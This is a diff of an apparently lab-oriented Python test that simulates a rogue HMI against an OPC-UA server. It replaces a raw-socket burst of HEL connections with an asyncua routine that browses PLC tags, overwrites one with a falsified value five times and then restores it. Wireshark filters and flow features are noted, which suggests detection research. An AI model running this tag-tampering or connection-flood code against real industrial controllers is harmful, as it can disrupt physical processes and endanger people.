@@ -1,92 +1,93 @@
 #!/usr/bin/env python3
 """
 tests/test_hmi_fake.py
-HMI_FAKE_DISPLAY — Giả lập HMI kết nối OPC-UA bất thường.
-Dùng raw socket vì server không cho phép full session.
-Tạo burst connect/HEL pattern — dấu vết rõ trong pcap.
+Ghi đè OPC-UA tag từ IP attacker — yêu cầu opcua_sim_server đang chạy.
 
 Chạy: python tests/test_hmi_fake.py
 """
 
 import sys
 import os
-import socket
-import struct
+import asyncio
 import time
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from tests.common import *
 
-TOTAL_CONNECTS = 30
-INTERVAL = 0.2
 
-
-def build_hello(host, port):
-    endpoint = f"opc.tcp://{host}:{port}".encode()
-    ep_len = len(endpoint)
-    msg_size = 28 + ep_len
-    return (
-        b'HEL' + b'F' +
-        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
-        struct.pack('<I', ep_len) + endpoint
-    )
-
-
-def fake_hmi_connect(host, port, hello_msg):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        s.connect((host, port))
-        s.send(hello_msg)
-        try:
-            s.recv(1024)
-        except Exception:
-            pass
-        s.close()
-        return True
-    except Exception:
-        return False
-
-
-def main():
-    host = HMI_IP
-    port = 4840
-
-    print(f"\n{B}[TEST] HMI_FAKE_DISPLAY (Raw OPC-UA){X}")
-    info(f"Target: {host}:{port}")
-    info(f"Burst {TOTAL_CONNECTS} connects, interval {INTERVAL}s")
-    info("Simulating rogue HMI — rapid connect/HEL bursts")
-    info("PLC KHONG thay doi — dau vet la OPC-UA TCP burst tu IP la")
+async def run_test():
+    print(f"\n{B}[TEST] HMI_FAKE_DISPLAY (OPC-UA TAGS){X}")
+    info(f"Server: {OPC_URL}")
 
     changes = []
     observable = []
     notes = []
     error = None
-    success_count = 0
     t0 = time.time()
 
-    hello = build_hello(host, port)
+    try:
+        from asyncua import Client
 
-    for i in range(TOTAL_CONNECTS):
-        result = fake_hmi_connect(host, port, hello)
-        if result:
-            success_count += 1
-            if (i + 1) % 10 == 0:
-                ok(f"Connect #{i+1:02d} -> HEL sent")
-        else:
-            if (i + 1) % 10 == 0:
-                warn(f"Connect #{i+1:02d} -> reset/fail")
-        time.sleep(INTERVAL)
+        async with Client(url=OPC_URL) as client:
+            ns_idx = await client.get_namespace_index("PLC")
+            ok(f"Connected, namespace PLC = {ns_idx}")
 
-    observable.append(f"OPC-UA burst: {TOTAL_CONNECTS} connects trong {time.time()-t0:.1f}s")
-    observable.append(f"IP nguon: attacker (khong phai HMI process)")
-    observable.append(f"Pattern: TCP SYN -> HEL -> RST (rapid, deu dan)")
-    notes.append(f"{success_count}/{TOTAL_CONNECTS} connections thanh cong")
-    notes.append("Wireshark: tcp.port==4840 && tcp.flags.syn==1")
-    notes.append("CIC feature: high Flow Packet/s, short Flow Duration")
+            # Browse tags
+            print(f"\n  {C}[BROWSE]{X}")
+            objects = client.nodes.objects
+            plc = await objects.get_child(f"{ns_idx}:PLC")
 
-    success = success_count > 0
+            tags = {}
+            for child in await plc.get_children():
+                name = (await child.read_browse_name()).Name
+                try:
+                    val = await child.read_value()
+                    tags[name] = (child, val)
+                    print(f"    {name} = {val}")
+                except Exception:
+                    print(f"    {name} = (error)")
+
+            if not tags:
+                warn("No writable tags found — start opcua_sim_server first")
+                error = "No tags"
+                return
+
+            first_tag = list(tags.keys())[0]
+            node, orig_val = tags[first_tag]
+            fake_val = (not orig_val) if isinstance(orig_val, bool) else round(orig_val * 1.5, 2)
+
+            ok(f"Write to {first_tag}: {orig_val} -> {fake_val}")
+            observable.append(f"OPC-UA Write: {first_tag} = {fake_val}")
+
+            for i in range(5):
+                await node.write_value(fake_val)
+                check = await node.read_value()
+                info(f"  #{i+1}: wrote {fake_val}, read back {check}")
+                await asyncio.sleep(1)
+
+            await node.write_value(orig_val)
+            check = await node.read_value()
+            ok(f"Restored {first_tag} = {check}")
+
+            notes.append(f"Tag: {first_tag}")
+            notes.append("Wireshark: opcua service WriteRequest")
+
+    except ImportError:
+        error = "asyncua not installed: pip install asyncua cryptography"
+        fail(error)
+    except ConnectionRefusedError:
+        error = f"OPC-UA server not running at {OPC_URL} — start: python -m attacks_ext.opcua_sim_server"
+        fail(error)
+    except Exception as e:
+        error = str(e)
+        fail(str(e))
+
+    success = error is None
     print_result("HMI_FAKE_DISPLAY", success, changes, observable, notes, time.time() - t0, error)
+
+
+def main():
+    asyncio.run(run_test())
 
 
 if __name__ == "__main__":
